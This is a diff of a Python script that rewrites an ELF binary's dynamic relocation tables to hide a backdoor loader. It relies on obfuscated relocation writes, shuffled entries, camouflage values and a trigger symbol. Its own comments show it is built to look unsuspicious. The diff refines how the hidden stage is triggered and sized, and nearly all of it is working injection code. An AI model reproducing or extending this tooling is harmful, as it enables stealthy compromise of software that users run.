@@ -24,9 +24,10 @@ GARBAGE_CODE_SIZE = 4  # time() ptr and junk code
 NUM_REL_TO_INSERT = 6
 RELACOUNT_TO_INCREASE = 4
 
-SYMBOL_0 = "_ITM_registerTMCloneTable"
+SYMBOL_0 = "_ZNKSt5ctypeIcE8do_widenEc"
 SYMBOL_1 = "__gmon_start__"
 SYMBOL_2 = "_ITM_deregisterTMCloneTable"
+SYMBOL_TRIGGER = "_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE10_M_disposeEv"
 
 random.seed(0x6D617820696E74656E73697479)
 
@@ -327,8 +328,6 @@ symbol_name_buffer = bss.header.sh_addr + bss.header.sh_size
 ifunc_meta = Elf64SymMeta(0, 0x0A, 0, SYMBOL_SECTION_INDEX.ABS.value)
 resolve_meta = Elf64SymMeta(symbol_name_buffer - strtab_vaddr, 0x12, 0, SYMBOL_SECTION_INDEX.UNDEF.value)
 BACKDOOR_RELOC = [
-    # Our loader use the first 8 bytes (offset in the first relocation) as size.
-    Relocation(len(original_jmprel) - ELF64_RELA_SIZE, RTYPE.NONE),
     # Symbol 0 was setup for memcpy before entering backdoor reloc. However we need to fix size.
     Relocation(stage2.symtab(SYMBOL_0) + 16, RTYPE.SIZE64, addend=8),
     # Fetch DT_DEBUG _r_debug
@@ -354,6 +353,7 @@ BACKDOOR_RELOC += shuffled(
         Relocation(value_buf.address, RTYPE.RELATIVE, addend=fake_fini_value_buf.address - 8),
         Relocation(stage2.symtab(SYMBOL_1) + 8, RTYPE.RELATIVE, addend=prepare_sc_buf.address),
         WriteIMM64Obf(symbol_name_buffer, u64(b"_dl_argv")),
+        WriteIMM64Obf(stage2.symtab(SYMBOL_2) + 16, 8),
     ]
     + [
         WriteIMM64Obf(prepare_sc_buf.address + i * 8, u64(piece))
@@ -384,19 +384,18 @@ reloc_capacity = len(original_jmprel) // ELF64_RELA_SIZE - 1
 print(f"Used relocation entries: {len(packed) // ELF64_RELA_SIZE} of {reloc_capacity}")
 assert len(packed) < len(original_jmprel)
 backdoor_reloc = hdr_gap.alloc(len(original_jmprel), "backdoor reloc").write(packed)
+backdoor_reloc_size = hdr_gap.alloc(14, "backdoor reloc size").write((b"\x00\x00\x01\x00" + p64(backdoor_reloc.address) + p64(len(original_jmprel) - ELF64_RELA_SIZE))[:14])
 
 # --- First layer of decoding below
 
-# Set the size field in ELF. We could do this in reloc, but it requires using a SIZE64 rtype, which is too sus.
-stage2.p64(stage2.symtab(SYMBOL_0) + 16, 8)  # size
-stage2.p64(stage2.symtab(SYMBOL_2) + 16, 8)  # size
+assert 2 <= stage2.u64(stage2.symtab(SYMBOL_0) + 16) <= 8
+stage2.p64(stage2.symtab(SYMBOL_0) + 16, 14)
 
-camouflage_hi = 0x2500 # stage2.symtab(SYMBOL_0) & 0xFF00
 new_rela = [
-    Relocation(stage2.symtab(SYMBOL_0) + 4, RTYPE.RELATIVE, addend=camouflage_hi | (SYMBOL_BINDINGS.LOCAL.value << 4) | SYMBOL_TYPES.NOTYPE.value),
-    Relocation(stage2.symtab(SYMBOL_0) + 6, RTYPE.RELATIVE, addend=camouflage_hi | (SYMBOL_SECTION_INDEX.ABS.value & 0xFF)),
-    Relocation(stage2.symtab(SYMBOL_0) + 7, RTYPE.RELATIVE, addend=camouflage_hi | (SYMBOL_SECTION_INDEX.ABS.value >> 8)),
-    Relocation(stage2.symtab(SYMBOL_0) + 8, RTYPE.RELATIVE, addend=backdoor_reloc.address),
+    Relocation(stage2.symtab(SYMBOL_0) + 4, RTYPE.RELATIVE, addend=0x2600 | (SYMBOL_BINDINGS.LOCAL.value << 4) | SYMBOL_TYPES.NOTYPE.value),
+    Relocation(stage2.symtab(SYMBOL_0) + 6, RTYPE.RELATIVE, addend=0x2500 | (SYMBOL_SECTION_INDEX.ABS.value & 0xFF)),
+    Relocation(stage2.symtab(SYMBOL_0) + 7, RTYPE.RELATIVE, addend=0x2500 | (SYMBOL_SECTION_INDEX.ABS.value >> 8)),
+    Relocation(stage2.symtab(SYMBOL_0) + 8, RTYPE.RELATIVE, addend=backdoor_reloc_size.address),
 ]
 assert len(new_rela) == RELACOUNT_TO_INCREASE
 new_rela.extend(map(Relocation.parse, lists.group(rela_dyn.header.sh_entsize, original_rela)))
@@ -406,8 +405,8 @@ for i, ent in enumerate(new_rela):
         first_copy = i
         break
 new_rela[first_copy:first_copy] = [
-    Relocation(offset=stage2.symtab(SYMBOL_0) + 16, type=RTYPE.COPY, symidx=stage2.symidx[SYMBOL_0]),
-    Relocation(offset=rela_plt.header.sh_addr, type=RTYPE.COPY, symidx=stage2.symidx[SYMBOL_0]),
+    Relocation(offset=stage2.symtab(SYMBOL_TRIGGER) + 4, type=RTYPE.COPY, symidx=stage2.symidx[SYMBOL_0]),
+    Relocation(offset=rela_plt.header.sh_addr, type=RTYPE.COPY, symidx=stage2.symidx[SYMBOL_TRIGGER]),
 ]
 assert len(pack_reloc(new_rela)) == len(stage2.section(".rela.dyn"))
 
